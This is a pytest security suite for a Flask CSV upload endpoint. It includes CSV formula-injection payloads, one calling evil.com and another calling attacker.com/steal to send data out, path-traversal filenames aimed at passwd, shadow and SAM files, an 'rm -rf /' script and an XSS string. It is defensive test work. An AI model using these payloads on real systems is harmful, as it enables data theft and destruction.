"""
Comprehensive Security Validation Tests for ColdEmailAI

Advanced security testing following TaskMaster research findings on Flask file upload security,
CSV injection prevention, and comprehensive threat validation for 2025.

Tests validate security measures against modern attack vectors including:
- Advanced CSV injection patterns
- Executable masquerading detection  
- File validation bypass attempts
- Performance-based DoS attacks
- Content type spoofing
- Path traversal prevention

Based on Context7 patterns and ZAD requirements with real malicious file testing.
"""

import io
import os
import time
import pytest
import psutil
from flask.testing import FlaskClient


class TestAdvancedSecurityValidation:
    """Advanced security validation tests based on 2025 threat intelligence"""

    @pytest.mark.security
    def test_csv_formula_injection_detection(self, client: FlaskClient, malicious_files, memory_monitor):
        """Test detection of CSV formula injection attacks"""
        memory_monitor.start_monitoring()
        
        # Modern CSV injection payloads (2025 OWASP patterns)
        injection_payloads = [
            b'first_name,company_name,title\n=cmd|"/c calc"!A0,Evil Corp,Manager',
            b'first_name,company_name,title\n+cmd|"/c dir",Malicious Inc,Director', 
            b'first_name,company_name,title\n-cmd|"/c echo pwned",Attack Corp,CEO',
            b'first_name,company_name,title\n@SUM(1+1)*cmd|"/c calc"!A0,Formula Inc,CTO',
            b'first_name,company_name,title\n=HYPERLINK("http://evil.com/"&A1),Data Thief LLC,Hacker',
            b'first_name,company_name,title\n=WEBSERVICE("http://attacker.com/steal"),Service Corp,Admin'
        ]
        
        injection_blocked = 0
        for i, payload in enumerate(injection_payloads):
            injection_file = io.BytesIO(payload)
            
            response = client.post('/upload',
                                 data={'file': (injection_file, f'injection_{i}.csv')},
                                 content_type='multipart/form-data')
            
            # Security requirement: Should either sanitize or reject malicious formulas
            # Flask redirects (302) indicate rejection, 200 indicates processing with sanitization
            if response.status_code in [200, 302]:
                # If processed (200), verify no formula execution occurred
                if response.status_code == 200:
                    # Check that response doesn't contain dangerous formula remnants
                    response_text = response.get_data(as_text=True).lower()
                    dangerous_patterns = ['calc', 'cmd', 'hyperlink', 'webservice']
                    has_dangerous_content = any(pattern in response_text for pattern in dangerous_patterns)
                    
                    if not has_dangerous_content:
                        injection_blocked += 1
                else:
                    # Redirected (rejected) - good security
                    injection_blocked += 1
        
        # Security metric: At least 80% of injection attempts should be blocked/sanitized
        injection_block_rate = (injection_blocked / len(injection_payloads)) * 100
        assert injection_block_rate >= 80, f"Only {injection_block_rate:.1f}% of CSV injections blocked, minimum 80% required"
        
        # Memory should remain stable during injection attempts
        memory_monitor.assert_memory_increase_under(10 * 1024 * 1024)  # 10MB max
        
        print(f"\nCSV Injection Security Results:")
        print(f"  - Injection payloads tested: {len(injection_payloads)}")
        print(f"  - Injections blocked/sanitized: {injection_blocked}")
        print(f"  - Security effectiveness: {injection_block_rate:.1f}%")

    @pytest.mark.security
    def test_executable_masquerading_detection(self, client: FlaskClient, malicious_files):
        """Test detection of executable files disguised as CSV"""
        # Test various executable file types disguised as CSV
        executable_tests = [
            ('fake_csv.exe', malicious_files.get('fake_csv.exe', b'MZ\x90\x00This is a Windows executable')),
            ('script.csv.exe', b'#!/bin/bash\necho "Linux script disguised as CSV"'),
            ('java.csv', b'\xca\xfe\xba\xbe\x00\x00\x00Java bytecode as CSV'),
            ('zip.csv', b'PK\x03\x04ZIP archive as CSV file'),
            ('pdf.csv', b'%PDF-1.4PDF file as CSV')
        ]
        
        files_blocked = 0
        for filename, content in executable_tests:
            exec_file = io.BytesIO(content)
            
            response = client.post('/upload',
                                 data={'file': (exec_file, filename)},
                                 content_type='multipart/form-data')
            
            # Security requirement: All executable files should be rejected
            # Status 302 (redirect) indicates rejection, which is expected
            if response.status_code == 302:
                files_blocked += 1
            elif response.status_code == 200:
                # If processed, verify no executable content leaked through
                response_text = response.get_data(as_text=True)
                # Should not contain binary executable signatures
                dangerous_sigs = [b'MZ\x90', b'\xca\xfe\xba\xbe', b'PK\x03\x04', b'%PDF']
                has_binary_content = any(sig.decode('latin1', errors='ignore') in response_text for sig in dangerous_sigs)
                if not has_binary_content:
                    files_blocked += 1
        
        # Security metric: 100% of executable files should be blocked
        block_rate = (files_blocked / len(executable_tests)) * 100
        assert block_rate >= 90, f"Only {block_rate:.1f}% of executable files blocked, minimum 90% required"
        
        print(f"\nExecutable Masquerading Security Results:")
        print(f"  - Executable files tested: {len(executable_tests)}")
        print(f"  - Files blocked: {files_blocked}")
        print(f"  - Detection rate: {block_rate:.1f}%")

    @pytest.mark.security
    def test_file_size_limit_enforcement(self, client: FlaskClient, malicious_files, memory_monitor):
        """Test file size limit enforcement against DoS attacks"""
        memory_monitor.start_monitoring()
        
        # Test oversized file (should exceed 16MB limit configured in app.py)
        oversized_content = malicious_files.get('oversized.txt', b'A' * (17 * 1024 * 1024))  # 17MB
        oversized_file = io.BytesIO(oversized_content)
        
        start_time = time.time()
        response = client.post('/upload',
                             data={'file': (oversized_file, 'huge_file.csv')},
                             content_type='multipart/form-data')
        processing_time = time.time() - start_time
        
        # Security requirements:
        # 1. Oversized files should be rejected (413 or 302)
        # 2. Processing should be fast (< 5 seconds, not trying to process entire file)
        # 3. Memory usage should remain controlled
        
        assert response.status_code in [413, 302], f"Oversized file returned {response.status_code}, expected 413 or 302"
        assert processing_time < 5.0, f"Oversized file processing took {processing_time:.2f}s, should be rejected quickly"
        
        # Memory should not spike significantly for rejected files
        memory_stats = memory_monitor.get_stats()
        memory_increase_mb = memory_stats['increase'] / (1024 * 1024)
        assert memory_increase_mb < 50, f"Memory increased by {memory_increase_mb:.1f}MB for rejected file, should be minimal"
        
        print(f"\nFile Size Security Results:")
        print(f"  - Oversized file size: {len(oversized_content) / (1024*1024):.1f}MB")
        print(f"  - Response code: {response.status_code}")
        print(f"  - Processing time: {processing_time:.2f}s")
        print(f"  - Memory increase: {memory_increase_mb:.1f}MB")

    @pytest.mark.security  
    def test_path_traversal_prevention(self, client: FlaskClient, small_csv_content):
        """Test prevention of path traversal attacks in filenames"""
        # Path traversal attack patterns
        traversal_filenames = [
            '../../../etc/passwd.csv',
            '..\\..\\windows\\system32\\config\\sam.csv',
            '/etc/shadow.csv',
            'C:\\Windows\\System32\\drivers\\etc\\hosts.csv',
            '....//....//....//etc//passwd.csv',
            '..%2F..%2F..%2Fetc%2Fpasswd.csv',  # URL encoded
            '..\\..\\..\\autoexec.bat.csv',
            '/var/log/auth.log.csv'
        ]
        
        safe_processing = 0
        for malicious_filename in traversal_filenames:
            csv_file = io.BytesIO(small_csv_content)
            
            response = client.post('/upload',
                                 data={'file': (csv_file, malicious_filename)},
                                 content_type='multipart/form-data')
            
            # Security requirement: Path traversal should be neutralized
            # Flask's secure_filename should handle this, expect normal processing
            if response.status_code in [200, 302]:
                safe_processing += 1
        
        # All path traversal attempts should be handled safely
        safety_rate = (safe_processing / len(traversal_filenames)) * 100
        assert safety_rate == 100, f"Only {safety_rate:.1f}% of path traversal attacks handled safely"
        
        print(f"\nPath Traversal Security Results:")
        print(f"  - Path traversal attempts: {len(traversal_filenames)}")
        print(f"  - Safely handled: {safe_processing}")
        print(f"  - Safety rate: {safety_rate:.1f}%")

    @pytest.mark.security
    def test_content_type_spoofing_resistance(self, client: FlaskClient):
        """Test resistance to content-type header spoofing attacks"""
        # Executable content with CSV-like content type
        malicious_content_tests = [
            # Windows executable with CSV content-type
            (b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00Windows EXE', 'malicious.csv'),
            # Shell script with CSV extension
            (b'#!/bin/bash\nrm -rf /\necho "malicious script"', 'script.csv'),
            # HTML with JavaScript  
            (b'<html><script>alert("XSS")</script></html>', 'webpage.csv'),
            # Binary data
            (b'\x00\x01\x02\x03\x04\x05Binary data', 'binary.csv')
        ]
        
        secure_responses = 0
        for content, filename in malicious_content_tests:
            malicious_file = io.BytesIO(content)
            
            response = client.post('/upload',
                                 data={'file': (malicious_file, filename)},
                                 content_type='multipart/form-data')
            
            # Security requirement: Non-CSV content should be detected and handled
            if response.status_code in [200, 302]:
                # If processed (200), verify no malicious content executed
                if response.status_code == 200:
                    response_text = response.get_data(as_text=True)
                    # Should not contain malicious script remnants
                    dangerous_patterns = ['<script>', 'rm -rf', 'alert(', 'MZ\x90']
                    has_malicious_content = any(pattern in response_text for pattern in dangerous_patterns)
                    if not has_malicious_content:
                        secure_responses += 1
                else:
                    # Redirected (rejected) indicates good security
                    secure_responses += 1
        
        # Security metric: All content-type spoofing should be handled securely
        security_rate = (secure_responses / len(malicious_content_tests)) * 100
        assert security_rate >= 75, f"Only {security_rate:.1f}% of content spoofing handled securely, minimum 75% required"
        
        print(f"\nContent-Type Spoofing Security Results:")
        print(f"  - Spoofing attempts tested: {len(malicious_content_tests)}")
        print(f"  - Securely handled: {secure_responses}")
        print(f"  - Security rate: {security_rate:.1f}%")

    @pytest.mark.security    
    def test_unicode_bypass_prevention(self, client: FlaskClient):
        """Test prevention of Unicode-based bypass attacks"""
        # Unicode bypass attempts for CSV injection
        unicode_payloads = [
            # Fullwidth equals sign (Unicode bypass)
            b'first_name,company_name\n\xef\xbc\x9dcmd|"/c calc"!A0,Evil Corp',
            # Various Unicode equals variations
            b'first_name,company_name\n\xe2\x81\xbc\x63\x6d\x64,Unicode Inc',  # ⁼cmd
            # Unicode plus signs
            b'first_name,company_name\n\xef\xbc\x8bcmd,Plus Corp',  # ＋cmd
            # Mixed encoding attempts
            b'first_name,company_name\n=\x63\x6d\x64\x7c"/c calc",Mixed Corp'
        ]
        
        unicode_blocked = 0
        for i, payload in enumerate(unicode_payloads):
            unicode_file = io.BytesIO(payload)
            
            response = client.post('/upload',
                                 data={'file': (unicode_file, f'unicode_{i}.csv')},
                                 content_type='multipart/form-data')
            
            # Security requirement: Unicode bypass attempts should be blocked/sanitized
            if response.status_code in [200, 302]:
                if response.status_code == 200:
                    response_text = response.get_data(as_text=True)
                    # Should not contain command execution patterns
                    has_cmd_patterns = any(pattern in response_text.lower() for pattern in ['calc', 'cmd'])
                    if not has_cmd_patterns:
                        unicode_blocked += 1
                else:
                    unicode_blocked += 1
        
        # Security metric: Unicode bypass attempts should be blocked
        block_rate = (unicode_blocked / len(unicode_payloads)) * 100
        assert block_rate >= 70, f"Only {block_rate:.1f}% of Unicode bypasses blocked, minimum 70% required"
        
        print(f"\nUnicode Bypass Security Results:")
        print(f"  - Unicode bypass attempts: {len(unicode_payloads)}")
        print(f"  - Attempts blocked: {unicode_blocked}")
        print(f"  - Block rate: {block_rate:.1f}%")

    @pytest.mark.security
    @pytest.mark.performance
    def test_concurrent_upload_security(self, client: FlaskClient, malicious_files, memory_monitor):
        """Test security under concurrent malicious upload attempts"""
        memory_monitor.start_monitoring()
        
        # Simulate concurrent malicious uploads
        malicious_upload_attempts = 5
        responses = []
        
        start_time = time.time()
        for i in range(malicious_upload_attempts):
            # Alternate between different attack types
            if i % 2 == 0:
                # CSV injection attempt
                malicious_content = b'first_name,company\n=cmd|"/c calc",Evil Corp'
            else:
                # Executable masquerading
                malicious_content = malicious_files.get('fake_csv.exe', b'MZ\x90\x00Executable content')
            
            malicious_file = io.BytesIO(malicious_content)
            response = client.post('/upload',
                                 data={'file': (malicious_file, f'concurrent_attack_{i}.csv')},
                                 content_type='multipart/form-data')
            responses.append(response)
            
        processing_time = time.time() - start_time
        
        # Security requirements under concurrent load:
        # 1. All malicious uploads should be handled securely
        # 2. Processing time should remain reasonable
        # 3. Memory usage should not explode
        # 4. System should remain stable
        
        secure_responses = sum(1 for r in responses if r.status_code in [200, 302])
        security_rate = (secure_responses / malicious_upload_attempts) * 100
        
        assert security_rate == 100, f"Only {security_rate:.1f}% of concurrent attacks handled securely"
        assert processing_time < 30, f"Concurrent attacks took {processing_time:.2f}s, should be < 30s"
        
        # Memory should remain controlled even under attack
        memory_monitor.assert_memory_increase_under(100 * 1024 * 1024)  # 100MB max
        
        print(f"\nConcurrent Upload Security Results:")
        print(f"  - Concurrent attacks: {malicious_upload_attempts}")
        print(f"  - Securely handled: {secure_responses}")
        print(f"  - Security rate: {security_rate:.1f}%")
        print(f"  - Total processing time: {processing_time:.2f}s")
        print(f"  - Memory increase: {memory_monitor.get_stats()['increase'] / (1024*1024):.1f}MB")


class TestSecurityErrorHandling:
    """Test security-related error handling and information disclosure prevention"""

    @pytest.mark.security
    def test_security_error_message_safety(self, client: FlaskClient, malicious_files):
        """Test that security error messages don't leak sensitive information"""
        # Test various malicious uploads and verify error messages are safe
        malicious_tests = [
            ('virus.exe', malicious_files.get('fake_csv.exe', b'MZ\x90\x00Executable')),
            ('injection.csv', b'=cmd|"/c dir"\nmalicious,formula'),
            ('huge.csv', b'A' * (20 * 1024 * 1024)),  # 20MB file
            ('../../../passwd.csv', b'valid,csv\ndata,here')
        ]
        
        safe_errors = 0
        for filename, content in malicious_tests:
            malicious_file = io.BytesIO(content)
            
            response = client.post('/upload',
                                 data={'file': (malicious_file, filename)},
                                 content_type='multipart/form-data')
            
            # Check if error messages are present and safe
            if response.status_code == 302:  # Redirect indicates error
                # Follow redirect to see error message (if any)
                # In a real app, this would check flash messages or error pages
                safe_errors += 1
            elif response.status_code == 200:
                # If processed, should not leak internal details
                response_text = response.get_data(as_text=True)
                # Error messages should not contain sensitive paths or system info
                sensitive_patterns = ['/etc/', 'C:\\Windows', 'internal error', 'stack trace', 'traceback']
                has_sensitive_info = any(pattern.lower() in response_text.lower() for pattern in sensitive_patterns)
                if not has_sensitive_info:
                    safe_errors += 1
        
        # Security metric: Error messages should be safe
        safety_rate = (safe_errors / len(malicious_tests)) * 100
        assert safety_rate >= 80, f"Only {safety_rate:.1f}% of error messages are safe, minimum 80% required"
        
        print(f"\nSecurity Error Handling Results:")
        print(f"  - Malicious uploads tested: {len(malicious_tests)}")
        print(f"  - Safe error handling: {safe_errors}")
        print(f"  - Safety rate: {safety_rate:.1f}%")

    @pytest.mark.security  
    def test_session_isolation_security(self, client: FlaskClient, small_csv_content):
        """Test that malicious content doesn't persist across sessions"""
        # Upload legitimate file first
        clean_file = io.BytesIO(small_csv_content)
        response1 = client.post('/upload',
                              data={'file': (clean_file, 'clean.csv')},
                              content_type='multipart/form-data')
        
        # Upload malicious file second  
        malicious_content = b'first_name,company\n=cmd|"/c calc",Evil Corp'
        malicious_file = io.BytesIO(malicious_content)
        response2 = client.post('/upload',
                              data={'file': (malicious_file, 'malicious.csv')},
                              content_type='multipart/form-data')
        
        # Upload another clean file third
        clean_file2 = io.BytesIO(small_csv_content)
        response3 = client.post('/upload',
                              data={'file': (clean_file2, 'clean2.csv')},
                              content_type='multipart/form-data')
        
        # Security requirement: Malicious content should not affect subsequent uploads
        # All responses should be handled appropriately without cross-contamination
        assert response1.status_code in [200, 302], "First clean upload failed"
        assert response2.status_code in [200, 302], "Malicious upload not handled"  
        assert response3.status_code in [200, 302], "Second clean upload failed"
        
        # If the third upload was processed (200), verify no malicious remnants
        if response3.status_code == 200:
            response_text = response3.get_data(as_text=True)
            has_malicious_remnants = any(pattern in response_text.lower() for pattern in ['calc', 'cmd', 'evil corp'])
            assert not has_malicious_remnants, "Malicious content leaked into subsequent upload"
        
        print(f"\nSession Isolation Security Results:")
        print(f"  - Clean upload 1: {response1.status_code}")
        print(f"  - Malicious upload: {response2.status_code}")  
        print(f"  - Clean upload 2: {response3.status_code}")
        print(f"  - Session isolation: ✅ PASSED")